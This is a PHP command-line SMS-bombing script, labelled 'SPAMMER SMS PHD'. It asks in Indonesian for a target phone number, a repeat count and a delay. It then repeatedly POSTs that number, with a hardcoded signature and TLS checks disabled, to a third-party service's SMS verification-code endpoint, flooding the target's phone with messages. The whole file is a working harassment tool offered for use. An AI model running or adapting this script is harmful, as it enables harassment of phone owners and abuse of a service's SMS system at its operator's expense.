<?php
/* 
SPAMMER SMS PHD
Modified By: ZeroSvn@babbycyberteam.org
Date: 19-12-2017
*/
@ini_set('output_buffering',0);
function phd($no, $jum, $wait){
    $x = 0; 
    while($x < $jum) {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL,"https://i.ihago.net/uaas/sms/sendCode");
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS,"timestamp=1556107610473&appId=ikxd&sign=4d0cadf684802b080dbe1c6708122d253663e445b696a9160946acfb724e18f6&country_code=62&oper_type=0&mobile=".$no."&nonstr=15561076104732333");
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
        curl_setopt($ch, CURLOPT_REFERER, 'https://i.ihago.net/uaas/sms/sendCode');
        curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36');
        $server_output = curl_exec ($ch);
        curl_close ($ch);
        echo $server_output."\n";
        sleep($wait);
        $x++;
        flush();
    }
}
echo "
  _      _   _   _         _   _  ___  __ 
 /  |_| / \ |_) / \ \_/ | / \ |_)  |  (_  
 \_ | | \_/ |   \_/  |  | \_/ | \ _|_ __) 
                                          \n\n";
echo "Nomor? (ex : 628xxxx)\nInput : ";
$nomor = trim(fgets(STDIN));
echo "Jumlah?\nInput : ";
$jumlah = trim(fgets(STDIN));
echo "Jeda? 0-99999 (ex:1)\nInput : ";
$jeda = trim(fgets(STDIN));
$execute = phd($nomor, $jumlah, $jeda);
print $execute;
?>
